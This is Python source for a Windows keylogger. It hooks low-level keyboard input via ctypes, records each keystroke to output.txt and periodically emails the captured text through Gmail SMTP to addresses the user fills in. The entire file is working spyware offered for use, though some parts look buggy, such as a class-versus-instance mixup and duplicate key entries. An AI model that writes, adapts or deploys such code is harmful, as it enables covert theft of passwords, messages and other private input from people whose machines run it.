import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import smtplib

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162
log = ''

def send_Email(msg):

    gmail_user = '' #enter e-mail you want to be sent
    gmail_password = '' #enter password for user e-mail

    sent_from = gmail_user  
    to = ['', '']  #enter e-mail
    subject = 'Rofl'  
    body = msg

    email_text = """\  
    From: %s  
    To: %s  
    Subject: %s

    %s
    """ % (sent_from, ", ".join(to), subject, body)

    try:  
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
        print('Email sent!')
    except smtplib.SMTPException:  
        server = smtplib.SMTP_SSL('smtp.gmail.com', 587)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
        print('Email sent!')
    except:
        pass
    




class KeyLogger:

    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        while self.hooked == None:
            try:
                self.hooked = self.lUser32.SetWindowsHookExA(
                    WH_KEYBOARD_LL,
                    pointer,
                    kernel32.GetModuleHandleW(),
                    0)
            except OSError:
                pass
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    ID_TO_KEY = {
        60129542152: '',
        64424509449: 'Tab',
        120259084301: 'Return',
        249108103188: 'Capital',
        4294967323: 'Escape',
        244813135904: ' ',
        #33: 'Prior',
        #34: 'Next',
        339302416419: 'End',
        304942678052: 'Home',
        322122547237: 'Left',
        309237645350: 'Up',
        330712481831: 'Right',
        343597383720: 'Down',
        360777252908: 'Snapshot', #PRTSCR
        356482285614: 'Delete',
        47244640304: '0',
        8589934641: '1',
        12884901938: '2',
        17179869235: '3',
        21474836532: '4',
        25769803829: '5',
        30064771126: '6',
        34359738423: '7',
        38654705720: '8',
        42949673017: '9',
        128849018945: 'A',
        206158430274: 'B',
        197568495683: 'C',
        137438953540: 'D',
        77309411397: 'E',
        141733920838: 'F',
        146028888135: 'G',
        150323855432: 'H',
        98784247881: 'I',
        154618822730: 'J',
        158913790027: 'K',
        163208757324: 'L',
        214748364877: 'M',
        210453397582: 'N',
        103079215183: 'O',
        107374182480: 'P',
        68719476817: 'Q',
        81604378706: 'R',
        133143986259: 'S',
        85899346004: 'T',
        94489280597: 'U',
        201863462998: 'V',
        73014444119: 'W',
        193273528408: 'X',
        90194313305: 'Y',
        188978561114: 'Z',
        390842024027: 'Lwin',
        # 92: 'Rwin',
        # 93: 'App',
        # 95: 'Sleep',
        352187318368: 'Numpad0',
        339302416481: 'Numpad1',
        343597383778: 'Numpad2',
        347892351075: 'Numpad3',
        322122547300: 'Numpad4',
        326417514597: 'Numpad5',
        330712481894: 'Numpad6',
        304942678119: 'Numpad7',
        309237645416: 'Numpad8',
        313532612713: 'Numpad9',
        236223201386: 'Multiply',
        335007449195: 'Add',
        317827580013: 'Subtract',
        356482285678: 'Decimal',
        227633266799: 'Divide',
        253403070576: 'F1',
        257698037873: 'F2',
        261993005170: 'F3',
        266287972467: 'F4',
        270582939764: 'F5',
        274877907061: 'F6',
        279172874358: 'F7',
        283467841655: 'F8',
        287762808952: 'F9',
        292057776249: 'F10',
        373662154874: 'F11',
        377957122171: 'F12',
        296352743568 : 'Numlock',
        180388626592 : 'Lshift',
        231928234145 : 'Rshift',
        124554051746 : 'Lcontrol',
        124554051747: 'Rcontrol',
        # 164: 'Lmenu',
        # 165: 'Rmenu',
        # 186: 'Oem_1',
        # 187: 'Oem_Plus',
        # 188: 'Oem_Comma',
        # 189: 'Oem_Minus',
        # 190: 'Oem_Period',
        # 191: 'Oem_2',
        # 192: 'Oem_3',
        # 219: 'Oem_4',
        # 220: 'Oem_5',
        # 221: 'Oem_6',
        # 222: 'Oem_7',
        # 1001: 'mouse left',  # mouse hotkeys
        # 1002: 'mouse right',
        # 1003: 'mouse middle',
        # 1000: 'mouse move',  # single event hotkeys
        # 1004: 'mouse wheel up',
        # 1005: 'mouse wheel down',
        124554051746: 'Ctrl',  # merged hotkeys
        240518168740: 'Alt',
        180388626592: 'Shift',
        390842024027: 'Win'
        }

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
    global log
    hookedKey = KeyLogger.ID_TO_KEY[lParam[0]]
    log = log + hookedKey
    if lParam[0] == 60129542152:
        log = log[:-1]
    print(log)
    if len(log) > 40:
        print('Creating Log File')
        with open('output.txt', 'a') as f:
            f.write(log)
            print('Completed log')
            f.write('\n')
            f.close()
        send_Email(log)
        log = ''
        KeyLogger.uninstallHookProc()
        pointer = getFPTR(hookProc)
        if KeyLogger.installHookProc(pointer):
            print("Hook Reinstalled")
        startKeyLog()
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)



def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)



KeyLogger = KeyLogger()
pointer = getFPTR(hookProc)
if KeyLogger.installHookProc(pointer):
    print("Hook installed")





startKeyLog()

